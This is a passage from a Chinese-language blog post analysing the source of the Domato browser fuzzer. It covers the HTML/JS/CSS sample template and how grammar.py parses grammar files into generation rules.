--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css"><span class="comment">/*begincss*/</span></span></span><br><span class="line"><span class="css">&lt;cssfuzzer&gt;</span></span><br><span class="line"><span class="css"><span class="comment">/*endcss*/</span></span></span><br><span class="line"><span class="css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">freememory</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">try</span> &#123; CollectGarbage(); &#125; <span class="keyword">catch</span>(err) &#123; &#125;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">try</span> &#123; FuzzingFunctions.garbageCollect(); &#125; <span class="keyword">catch</span>(err) &#123; &#125;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">try</span> &#123; FuzzingFunctions.cycleCollect(); &#125; <span class="keyword">catch</span>(err) &#123; &#125;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">try</span> &#123; <span class="built_in">window</span>.gc(); &#125; <span class="keyword">catch</span>(err) &#123; &#125;</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> runcount = &#123;<span class="string">&#x27;jsfuzzer&#x27;</span>:<span class="number">0</span>, <span class="string">&#x27;eventhandler1&#x27;</span>:<span class="number">0</span>, <span class="string">&#x27;eventhandler2&#x27;</span>:<span class="number">0</span>, <span class="string">&#x27;eventhandler3&#x27;</span>:<span class="number">0</span>, <span class="string">&#x27;eventhandler4&#x27;</span>:<span class="number">0</span>, <span class="string">&#x27;eventhandler5&#x27;</span>:<span class="number">0</span>&#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">GetVariable</span>(<span class="params">fuzzervars, var_type</span>) </span>&#123; <span class="keyword">if</span>(fuzzervars[var_type]) &#123; <span class="keyword">return</span> fuzzervars[var_type]; &#125; <span class="keyword">else</span> &#123; <span class="keyword">return</span> <span class="literal">null</span>; &#125;&#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">SetVariable</span>(<span class="params">fuzzervars, var_name, var_type</span>) </span>&#123; fuzzervars[var_type] = var_name; &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">jsfuzzer</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">runcount[<span class="string">&quot;jsfuzzer&quot;</span>]++; <span class="keyword">if</span>(runcount[<span class="string">&quot;jsfuzzer&quot;</span>] &gt; <span class="number">2</span>) &#123; <span class="keyword">return</span>; &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">&lt;jsfuzzer&gt;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">eventhandler1</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">runcount[<span class="string">&quot;eventhandler1&quot;</span>]++; <span class="keyword">if</span>(runcount[<span class="string">&quot;eventhandler1&quot;</span>] &gt; <span class="number">2</span>) &#123; <span class="keyword">return</span>; &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">&lt;jsfuzzer&gt;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">eventhandler2</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">runcount[<span class="string">&quot;eventhandler2&quot;</span>]++; <span class="keyword">if</span>(runcount[<span class="string">&quot;eventhandler2&quot;</span>] &gt; <span class="number">2</span>) &#123; <span class="keyword">return</span>; &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">&lt;jsfuzzer&gt;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">eventhandler3</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">runcount[<span class="string">&quot;eventhandler3&quot;</span>]++; <span class="keyword">if</span>(runcount[<span class="string">&quot;eventhandler3&quot;</span>] &gt; <span class="number">2</span>) &#123; <span class="keyword">return</span>; &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">&lt;jsfuzzer&gt;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">eventhandler4</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">runcount[<span class="string">&quot;eventhandler4&quot;</span>]++; <span class="keyword">if</span>(runcount[<span class="string">&quot;eventhandler4&quot;</span>] &gt; <span class="number">2</span>) &#123; <span class="keyword">return</span>; &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">&lt;jsfuzzer&gt;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">eventhandler5</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">runcount[<span class="string">&quot;eventhandler5&quot;</span>]++; <span class="keyword">if</span>(runcount[<span class="string">&quot;eventhandler5&quot;</span>] &gt; <span class="number">2</span>) &#123; <span class="keyword">return</span>; &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">&lt;jsfuzzer&gt;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">jsfuzzer()</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--beginhtml--&gt;</span><span class="tag">&lt;<span class="name">htmlfuzzer</span>&gt;</span><span class="comment">&lt;!--endhtml--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>分别将<htmlfuzzer>，<jsfuzzer>，<cssfuzzer>在对应的位置进行替换，只要保证模板语法正确，生成的html，css，js语法正确，并可以通过js成功与DOM元素进行交互，在对变量的边界值做个界定，这样一个生成各个html样本的生成器就完成了，当然generator.py这个文件只是个壳子，真正的功能点在grammar.py实现，还有我们自定义的语法文件，我们可以根据自己的需要定制化规则和代码。</p><p>关键函数的流程大致如下，</p><p><img src="/2022/04/14/domato101/image-20220117201908982.png" alt="image-20220117201908982"></p><h3 id="grammar-py-1"><a href="#grammar-py-1" class="headerlink" title="grammar.py"></a>grammar.py</h3><p>上面我们有几块代码没有跟，分别是generate_samples函数调用的<code>parse_from_file</code>，generate_new_sample函数调用的<code>generate_symbol</code>还有generate_function_body函数调用的<code>_generate_code</code>。在上面对代码分析时也已经大概了解了这三个函数相关的功能了</p><p><code>parse_from_file</code>：从文件中解析语法并生成一个操作”类”，可以使用该”类”进行一些函数操作。</p><p><code>generate_symbol</code>：使用上面的操作”类”生成随机的html和css代码。</p><p><code>_generate_code</code>：使用上面的操作”类”生成随机的js代码。</p><p>最开始还有一个类的定义，Grammar()，我们先看下Grammar类的代码</p><h4 id="Grammar"><a href="#Grammar" class="headerlink" title="Grammar"></a>Grammar</h4><p>这个类接近1000行代码，就不贴了，其实grammar.py文件主要的逻辑都在里面，所以我们研究那三个函数即可。这里贴出定义结构体的代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Grammar</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">   <span class="comment"># 接近1000行</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self._root = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        self._creators = &#123;&#125;</span><br><span class="line">        self._nonrecursive_creators = &#123;&#125;</span><br><span class="line">        self._all_rules = []</span><br><span class="line">        self._interesting_lines = &#123;&#125;</span><br><span class="line">        self._all_nonhelper_lines = []</span><br><span class="line"></span><br><span class="line">        self._creator_cdfs = &#123;&#125;</span><br><span class="line">        self._nonrecursivecreator_cdfs = &#123;&#125;</span><br><span class="line"></span><br><span class="line">        self._var_format = <span class="string">&#x27;var%05d&#x27;</span></span><br><span class="line"></span><br><span class="line">        self._definitions_dir = <span class="string">&#x27;.&#x27;</span></span><br><span class="line"></span><br><span class="line">        self._imports = &#123;&#125;</span><br><span class="line"></span><br><span class="line">        self._functions = &#123;&#125;</span><br><span class="line"></span><br><span class="line">        self._line_guard = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">        self._recursion_max = <span class="number">50</span></span><br><span class="line">        self._var_reuse_prob = <span class="number">0.75</span></span><br><span class="line">        self._interesting_line_prob = <span class="number">0.9</span></span><br><span class="line">        self._max_vars_of_same_type = <span class="number">5</span></span><br><span class="line"></span><br><span class="line">        self._inheritance = &#123;&#125;</span><br><span class="line"></span><br><span class="line">        self._cssgrammar = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Helper dictionaries for creating built-in types.</span></span><br><span class="line">        self._constant_types = &#123;</span><br><span class="line">            <span class="string">&#x27;lt&#x27;</span>: <span class="string">&#x27;&lt;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;gt&#x27;</span>: <span class="string">&#x27;&gt;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;hash&#x27;</span>: <span class="string">&#x27;#&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;cr&#x27;</span>: <span class="built_in">chr</span>(<span class="number">13</span>),</span><br><span class="line">            <span class="string">&#x27;lf&#x27;</span>: <span class="built_in">chr</span>(<span class="number">10</span>),</span><br><span class="line">            <span class="string">&#x27;space&#x27;</span>: <span class="string">&#x27; &#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;tab&#x27;</span>: <span class="built_in">chr</span>(<span class="number">9</span>),</span><br><span class="line">            <span class="string">&#x27;ex&#x27;</span>: <span class="string">&#x27;!&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        self._built_in_types = &#123;</span><br><span class="line">            <span class="string">&#x27;int&#x27;</span>: self._generate_int,</span><br><span class="line">            <span class="string">&#x27;int32&#x27;</span>: self._generate_int,</span><br><span class="line">            <span class="string">&#x27;uint32&#x27;</span>: self._generate_int,</span><br><span class="line">            <span class="string">&#x27;int8&#x27;</span>: self._generate_int,</span><br><span class="line">            <span class="string">&#x27;uint8&#x27;</span>: self._generate_int,</span><br><span class="line">            <span class="string">&#x27;int16&#x27;</span>: self._generate_int,</span><br><span class="line">            <span class="string">&#x27;uint16&#x27;</span>: self._generate_int,</span><br><span class="line">            <span class="string">&#x27;int64&#x27;</span>: self._generate_int,</span><br><span class="line">            <span class="string">&#x27;uint64&#x27;</span>: self._generate_int,</span><br><span class="line">            <span class="string">&#x27;float&#x27;</span>: self._generate_float,</span><br><span class="line">            <span class="string">&#x27;double&#x27;</span>: self._generate_float,</span><br><span class="line">            <span class="string">&#x27;char&#x27;</span>: self._generate_char,</span><br><span class="line">            <span class="string">&#x27;string&#x27;</span>: self._generate_string,</span><br><span class="line">            <span class="string">&#x27;htmlsafestring&#x27;</span>: self._generate_html_string,</span><br><span class="line">            <span class="string">&#x27;hex&#x27;</span>: self._generate_hex,</span><br><span class="line">            <span class="string">&#x27;import&#x27;</span>: self._generate_import,</span><br><span class="line">            <span class="string">&#x27;lines&#x27;</span>: self._generate_lines</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        self._command_handlers = &#123;</span><br><span class="line">            <span class="string">&#x27;varformat&#x27;</span>: self._set_variable_format,</span><br><span class="line">            <span class="string">&#x27;include&#x27;</span>: self._include_from_file,</span><br><span class="line">            <span class="string">&#x27;import&#x27;</span>: self._import_grammar,</span><br><span class="line">            <span class="string">&#x27;lineguard&#x27;</span>: self._set_line_guard,</span><br><span class="line">            <span class="string">&#x27;max_recursion&#x27;</span>: self._set_recursion_depth,</span><br><span class="line">            <span class="string">&#x27;var_reuse_prob&#x27;</span>: self._set_var_reuse_probability,</span><br><span class="line">            <span class="string">&#x27;extends&#x27;</span>: self._set_extends</span><br><span class="line">            ...</span><br></pre></td></tr></table></figure><h4 id="parse-from-file"><a href="#parse-from-file" class="headerlink" title="parse_from_file"></a>parse_from_file</h4><p><code>parse_from_file</code>函数并没有做太多的工作，读取了传入的语法文件，并将内容放入content中，之后调用<code>parse_from_string</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">parse_from_file</span>(<span class="params">self, filename</span>):</span></span><br><span class="line">      <span class="string">&quot;&quot;&quot;从文件中解析语法</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">打开一个txt文件，解析并加载语法规则，语法详情查看readme。</span></span><br><span class="line"><span class="string">import可以使语法文件包含其他语法文件。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      Args:</span></span><br><span class="line"><span class="string">          filename: 语法文件绝对路径</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      Returns:</span></span><br><span class="line"><span class="string">         错误号，便于排查错误。</span></span><br><span class="line"><span class="string">      &quot;&quot;&quot;</span></span><br><span class="line"><span class="meta">... </span></span><br><span class="line">      <span class="keyword">return</span> self.parse_from_string(content)<span class="comment"># 使用content变量将文件内容存储起来。</span></span><br></pre></td></tr></table></figure><h5 id="parse-from-string"><a href="#parse-from-string" class="headerlink" title="parse_from_string"></a>parse_from_string</h5><p>该函数相当于解析的主函数。</p><p>使用了<code>_include_from_string</code>将文件中的语法放入其对应的grammar中，这个grammar在generator.py中为htmlgrammar，cssgrammar，jsgrammar。</p><p><code>_normalize_probabilities</code>会统计语法中出现的概率，放入self中的<code>_creator_cdfs</code>和<code>_nonrecursivecreator_cdfs</code>字段中。</p><p><code>_compute_interesting_indices</code>会统计js代码中“有趣”的行，并在之后生成js随机代码中出现更高的频率。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_from_string</span>(<span class="params">self, grammar_str</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;从字符串中解析语法</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">     将字符串按行解析并加载语法规则。语法详情查看readme。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        grammar_str: 从与反文件中读取的语法，以字符串格式进行存储。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        错误号，便于排查错误。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    errors = self._include_from_string(grammar_str)<span class="comment"># 将语法从grammar_str放入self中</span></span><br><span class="line">    <span class="keyword">if</span> errors:</span><br><span class="line">        <span class="keyword">return</span> errors</span><br><span class="line"></span><br><span class="line">    self._normalize_probabilities()<span class="comment"># 统计语法中出现的概率，放入self中的某个字段中</span></span><br><span class="line">    self._compute_interesting_indices()<span class="comment"># 在传入文件为js.txt时第一次起作用。该函数会判断每行是否有&lt;line&gt;，而js.txt中存在</span></span><br><span class="line">    <span class="comment"># !lineguard try &#123; &lt;line&gt; &#125; catch(e) &#123; &#125;</span></span><br><span class="line">        <span class="comment"># 会让js.txt每行都尝试加入一个&lt;line&gt;，从而触发该函数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><h5 id="include-from-string"><a href="#include-from-string" class="headerlink" title="_include_from_string"></a>_include_from_string</h5><p>跟入函数，该函数为语法存储的关键函数。首先识别每行是否为注释，如果为注释则不处理，之后匹配是否为预定义命令，比如<code>!include</code>等等，如果识别到则交由对应的函数进行处理。否则就使用<code>_parse_grammar_line</code>处理每行代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_include_from_string</span>(<span class="params">self, grammar_str</span>):</span></span><br><span class="line">       in_code = <span class="literal">False</span></span><br><span class="line">       helper_lines = <span class="literal">False</span></span><br><span class="line">       in_function = <span class="literal">False</span></span><br><span class="line">       num_errors = <span class="number">0</span></span><br><span class="line">       lines = grammar_str.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">       <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> <span class="keyword">not</span> in_function:</span><br><span class="line">               cleanline = self._remove_comments(line)<span class="comment"># 删除每行的注释</span></span><br><span class="line">               <span class="keyword">if</span> <span class="keyword">not</span> cleanline:</span><br><span class="line">                   <span class="keyword">continue</span></span><br><span class="line">           <span class="keyword">else</span>:</span><br><span class="line">               cleanline = line</span><br><span class="line"></span><br><span class="line">           <span class="comment"># Process special commands</span></span><br><span class="line">           match = re.match(<span class="string">r&#x27;^!([a-z_]+)\s*(.*)$&#x27;</span>, cleanline)</span><br><span class="line">           <span class="keyword">if</span> match:<span class="comment"># 当匹配到预定义命令。 eg:    &#x27;!include common.txt&#x27;</span></span><br><span class="line">               command = match.group(<span class="number">1</span>)<span class="comment"># eg: include</span></span><br><span class="line">               params = match.group(<span class="number">2</span>)<span class="comment"># eg: common.txt</span></span><br><span class="line">               <span class="string">&quot;&quot;&quot;        </span></span><br><span class="line"><span class="string">       self._command_handlers = &#123;</span></span><br><span class="line"><span class="string">           &#x27;varformat&#x27;: self._set_variable_format,</span></span><br><span class="line"><span class="string">           &#x27;include&#x27;: self._include_from_file,</span></span><br><span class="line"><span class="string">           &#x27;import&#x27;: self._import_grammar,</span></span><br><span class="line"><span class="string">           &#x27;lineguard&#x27;: self._set_line_guard,</span></span><br><span class="line"><span class="string">           &#x27;max_recursion&#x27;: self._set_recursion_depth,</span></span><br><span class="line"><span class="string">           &#x27;var_reuse_prob&#x27;: self._set_var_reuse_probability,</span></span><br><span class="line"><span class="string">           &#x27;extends&#x27;: self._set_extends</span></span><br><span class="line"><span class="string">       &#125;&quot;&quot;&quot;</span></span><br><span class="line">               <span class="keyword">if</span> command <span class="keyword">in</span> self._command_handlers:<span class="comment"># 匹配到相关的关键词时调用对应的函数。</span></span><br><span class="line">                   self._command_handlers[command](params)<span class="comment"># eg:  &#x27;include&#x27;: self._include_from_file,</span></span><br><span class="line">               <span class="keyword">elif</span> command == <span class="string">&#x27;begin&#x27;</span> <span class="keyword">and</span> params == <span class="string">&#x27;lines&#x27;</span>:</span><br><span class="line">                   in_code = <span class="literal">True</span></span><br><span class="line">                   helper_lines = <span class="literal">False</span></span><br><span class="line">               <span class="keyword">elif</span> command == <span class="string">&#x27;begin&#x27;</span> <span class="keyword">and</span> params == <span class="string">&#x27;helperlines&#x27;</span>:</span><br><span class="line">                   in_code = <span class="literal">True</span></span><br><span class="line">                   helper_lines = <span class="literal">True</span></span><br><span class="line">               <span class="keyword">elif</span> command == <span class="string">&#x27;end&#x27;</span> <span class="keyword">and</span> params <span class="keyword">in</span> (<span class="string">&#x27;lines&#x27;</span>, <span class="string">&#x27;helperlines&#x27;</span>):</span><br><span class="line">                   <span class="keyword">if</span> in_code:</span><br><span class="line">                       in_code = <span class="literal">False</span></span><br><span class="line">               <span class="keyword">elif</span> command == <span class="string">&#x27;begin&#x27;</span> <span class="keyword">and</span> params.startswith(<span class="string">&#x27;function&#x27;</span>):</span><br><span class="line">                   match = re.match(<span class="string">r&#x27;^function\s*([a-zA-Z._0-9]+)$&#x27;</span>, params)</span><br><span class="line">                   <span class="keyword">if</span> match <span class="keyword">and</span> <span class="keyword">not</span> in_function:</span><br><span class="line">                       function_name = match.group(<span class="number">1</span>)</span><br><span class="line">                       function_body = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                       in_function = <span class="literal">True</span></span><br><span class="line">                   <span class="keyword">else</span>:</span><br><span class="line">                       <span class="built_in">print</span>(<span class="string">&#x27;Error parsing line &#x27;</span> + line)</span><br><span class="line">                       num_errors += <span class="number">1</span></span><br><span class="line">               <span class="keyword">elif</span> command == <span class="string">&#x27;end&#x27;</span> <span class="keyword">and</span> params == <span class="string">&#x27;function&#x27;</span>:</span><br><span class="line">                   <span class="keyword">if</span> in_function:</span><br><span class="line">                       in_function = <span class="literal">False</span></span><br><span class="line">                       self._save_function(function_name, function_body)</span><br><span class="line">               <span class="keyword">else</span>:</span><br><span class="line">                   <span class="built_in">print</span>(<span class="string">&#x27;Unknown command: &#x27;</span> + command)</span><br><span class="line">                   num_errors += <span class="number">1</span></span><br><span class="line">               <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">           <span class="keyword">try</span>:</span><br><span class="line">               <span class="keyword">if</span> in_function:</span><br><span class="line">                   function_body += cleanline + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">               <span class="keyword">elif</span> in_code:</span><br><span class="line">                   self._parse_code_line(cleanline, helper_lines)<span class="comment"># 如果是code则交由该函数处理</span></span><br><span class="line">               <span class="keyword">else</span>:</span><br><span class="line">                   self._parse_grammar_line(cleanline)<span class="comment"># 每行语法一般都交由该函数进行处理</span></span><br><span class="line">           <span class="keyword">except</span> GrammarError:</span><br><span class="line">               <span class="built_in">print</span>(<span class="string">&#x27;Error parsing line &#x27;</span> + line)</span><br><span class="line">               num_errors += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> num_errors</span><br></pre></td></tr></table></figure><h5 id="parse-grammar-line"><a href="#parse-grammar-line" class="headerlink" title="_parse_grammar_line"></a>_parse_grammar_line</h5><p>可以看出代码逻辑主要将传入的<code>line</code>放<code>入self._all_rules</code>中。也会在<code>self._creators</code>的对应<code>tag_name</code>中放入对应的元素。该函数的作用主要是将传入的一行语法录入到self的属性中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_parse_grammar_line</span>(<span class="params">self, line</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Parses a grammar rule.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># Check if the line matches grammar rule pattern (&lt;tagname&gt; = ...).</span></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Parse the line to create a grammar rule.</span></span><br><span class="line">    ...</span><br><span class="line">   </span><br><span class="line">    <span class="comment"># Splits the line into constant parts and tags. For example</span></span><br><span class="line">    <span class="comment"># &quot;foo&lt;bar&gt;baz&quot; would be split into three parts, &quot;foo&quot;, &quot;bar&quot; and &quot;baz&quot;</span></span><br><span class="line">    <span class="comment"># Every other part is going to be constant and every other part</span></span><br><span class="line">    <span class="comment"># is going to be a tag, always starting with a constant. Empty</span></span><br><span class="line">    <span class="comment"># spaces between tags/beginning/end are not a problem because</span></span><br><span class="line">    <span class="comment"># then empty strings will be returned in corresponding places,</span></span><br><span class="line">    <span class="comment"># for example &quot;&lt;foo&gt;&lt;bar&gt;&quot; gets split into &quot;&quot;, &quot;foo&quot;, &quot;&quot;, &quot;bar&quot;, &quot;&quot;</span></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Store the rule in appropriate sets.</span></span><br><span class="line">    create_tag_name = rule[<span class="string">&#x27;creates&#x27;</span>][<span class="string">&#x27;tagname&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> create_tag_name <span class="keyword">in</span> self._creators:</span><br><span class="line">        self._creators[create_tag_name].append(rule)</span><br><span class="line">    <span 